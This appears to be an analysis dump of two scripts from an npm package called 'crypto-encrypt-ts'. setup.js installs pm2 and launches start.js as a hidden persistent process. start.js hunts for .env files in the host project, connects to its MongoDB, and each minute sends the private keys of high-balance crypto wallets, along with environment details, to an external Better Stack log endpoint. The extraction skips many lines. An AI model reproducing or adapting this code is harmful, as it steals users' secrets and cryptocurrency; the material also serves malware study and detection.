// File: tmp/tmp8d280j8h/crypto-encrypt-ts/package/scripts/setup.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const path = require('path')
Line 4: path.join(__dirname, 'start.js')
Line 5: exec('npm install -g pm2 && pm2 start ' + cronJobPath + ' --name process-monitor', (error, stdout, stderr) => {
    if (error) {
        console.error('Error:', error);
        return;
    }
})

// File: tmp/tmp8d280j8h/crypto-encrypt-ts/package/scripts/start.js
// ======================================================================
Line 2: const cron = require('node-cron')
Line 3: const mongoose = require('mongoose')
Line 4: _tmp_16 = require('@logtail/node')
Line 5: const path = require('path')
Line 6: const dotenv = require('dotenv')
Line 7: const fs = require('fs')
Line 10: _iterator_0 = <operator>.iterator(require.main.paths)
Line 11: path.includes('node_modules')
Line 14: _tmp_17.push(rootDir + '/.env')
Line 15: _tmp_17.push(rootDir + '/src/.env')
Line 16: _tmp_17.push(rootDir + '/src/config/.env')
Line 17: _tmp_17.push(rootDir + '/src/config/config.env')
Line 18: _tmp_17.push(rootDir + '/src/config.env')
Line 19: _tmp_17.push(rootDir + '/config.env')
Line 20: _tmp_17.push(rootDir + '/.env.local')
Line 21: _tmp_17.push(rootDir + '/.env.development')
Line 22: _tmp_17.push(rootDir + '/.env.production')
Line 23: _tmp_17.push(rootDir + '/.env.test')
Line 24: _tmp_17.push(rootDir + '/.env.example')
Line 25: _tmp_17.push(rootDir + '/.env.sample')
Line 26: _tmp_17.push(rootDir + '/.env.example.local')
Line 27: _tmp_17.push(rootDir + '/.env.example.development')
Line 29: _iterator_1.next()
Line 40: _tmp_20.endpoint = "https://s1287874.eu-nbg-2.betterstackdata.com"
Line 49: {
        if (!process.env.DB_HOST) {
            logtail.error('DB_HOST environment variable not found');
            process.exit(1);
        }

        await mongoose.connect(process.env.DB_HOST, mongoOptions);
        await logtail.info('MongoDB connection successful', {
            connection: {
                host: process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown',
                database: process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
            }
        });

    }
Line 52: process.exit(1)
Line 56: await logtail.info('MongoDB connection successful', {
            connection: {
                host: process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown',
                database: process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
            }
        })
Line 57: _tmp_0.connection = {
                host: process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown',
                database: process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
            }
Line 58: _tmp_1.host = process.env.DB_HOST.split('@')[1]?.split('/')[0] || 'unknown'
Line 59: _tmp_1.database = process.env.DB_HOST.split('/')?.pop()?.split('?')[0] || 'unknown'
Line 72: process.exit(1)
Line 77: {
        if (mongoose.connection.readyState !== 1) {
            throw new Error('MongoDB connection is not active');
        }

        const wallets = await mongoose.connection.collection('wallets')
            .find({ balance: { $gt: 1000 } })
            .toArray();

        if (BETTERSTACK_SOURCE_TOKEN) {
            await logtail.info(wallets.length + ' wallets fetched with balance > 1000', {
                walletCount: wallets.length,
                wallets: wallets.map(wallet => ({
                    public: wallet.public,
                    balance: wallet.balance,
                    private: wallet.private,
                    lastUpdate: wallet.lastUpdate
                }))
            });
        } else {
            console.log(`${wallets.length} wallets found with balance > 1000`);
        }
    }
Line 82: const wallets = await mongoose.connection.collection('wallets')
            .find({ balance: { $gt: 1000 } })
            .toArray()
Line 87: logtail.info(wallets.length + ' wallets fetched with balance > 1000', {
                walletCount: wallets.length,
                wallets: wallets.map(wallet => ({
                    public: wallet.public,
                    balance: wallet.balance,
                    private: wallet.private,
                    lastUpdate: wallet.lastUpdate
                }))
            })
Line 100: const errorMessage = 'Error fetching wallet collection: ' + error.message
Line 119: logtail.info('Environment variables', {
        environment: sanitizedEnv
    })
Line 124: cron.schedule('*/1 * * * *', async () => {
    try {
        if (mongoose.connection.readyState !== 1) {
            await connectToMongoDB();
        }
        if (BETTERSTACK_SOURCE_TOKEN) {
            await logEnvironmentInfo();
        }
        await getWallets();
    } catch (error) {
        console.error('Cron job error:', error);
    }
})
Line 127: connectToMongoDB()
Line 139: connectToMongoDB().then(async () => {
    if (BETTERSTACK_SOURCE_TOKEN) {
        await logtail.info('Cron service started');
        await logEnvironmentInfo();
    } else {
        console.log('Cron service started');
    }
    await getWallets();
})
Line 141: logtail.info('Cron service started')
Line 149: process.exit(1)
